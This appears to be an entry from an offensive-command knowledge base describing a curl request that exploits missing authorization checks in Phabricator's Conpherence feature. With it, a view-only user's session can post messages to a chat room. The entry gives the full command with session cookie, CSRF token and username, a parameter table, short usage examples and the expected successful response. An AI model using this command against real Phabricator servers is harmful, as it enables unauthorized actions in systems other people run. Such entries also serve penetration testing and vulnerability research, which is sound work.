---
id: cmd-001
data: >-
  curl -X POST 'http://192.168.25.10/conpherence/update/1/' -H 'User-Agent:
  Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H
  'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H
  'X-Phabricator-Csrf: B@6uaixbh422c60ea95853fee4' -H 'X-Phabricator-Via: /' -H
  'Content-Type: application/x-www-form-urlencoded' -H 'Cookie:
  phsid=35yvcfc22xj27th6hwawazghx5cnritidfccxdhh; phusr=lucasveiga' -d
  '__form__=1&action=message&text=TESTTEXT&latest_transaction_id=10&__wflow__=true&__ajax__=true&__metablock__=6'
tags:
  - privilege-escalation
  - http-post
  - phabricator
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.108Z'
verified: false
validated: true
submitted: true
---
# phabricator-conpherence-unauthorized-message-post

## Command

```bash
curl -X POST 'http://192.168.25.10/conpherence/update/1/' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'X-Phabricator-Csrf: B@6uaixbh422c60ea95853fee4' \
  -H 'X-Phabricator-Via: /' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: phsid=35yvcfc22xj27th6hwawazghx5cnritidfccxdhh; phusr=lucasveiga' \
  --data-raw '__form__=1&action=message&text=TESTTEXT&latest_transaction_id=10&__wflow__=true&__ajax__=true&__metablock__=6'
```

## Description

This curl command sends an unauthorized message to a Phabricator Conpherence room by POSTing to the update endpoint using a view-only user's session, exploiting missing authorization checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `URL` | Target endpoint, e.g., http://host/conpherence/update/{room_id}/ | Yes |
| `-H 'User-Agent: ...'` | Mimics browser headers | Yes |
| `-H 'X-Phabricator-Csrf: ...'` | CSRF token from session | Yes |
| `-H 'Cookie: ...'` | Session cookies (phsid, phusr) | Yes |
| `--data-raw` | Form data including action=message, text=message_content, etc. | Yes |
| `text` | Message content to send | Yes |
| `latest_transaction_id` | Room's current transaction ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://phabricator/conpherence/update/1/' -H 'Cookie: phsid=session; phusr=user' -H 'X-Phabricator-Csrf: token' -d 'action=message&text=Hello&latest_transaction_id=10'
```

### Advanced Usage

Include full headers and AJAX flags as in the primary command for production-like requests.

## Expected Output

HTTP 200 OK response with JSON or HTML indicating successful transaction update; the message will appear in the room upon refresh.

## Related

- [[Related Procedure|procedures/Exploit-Phabricator-Conpherence-Privilege-Escalation]]
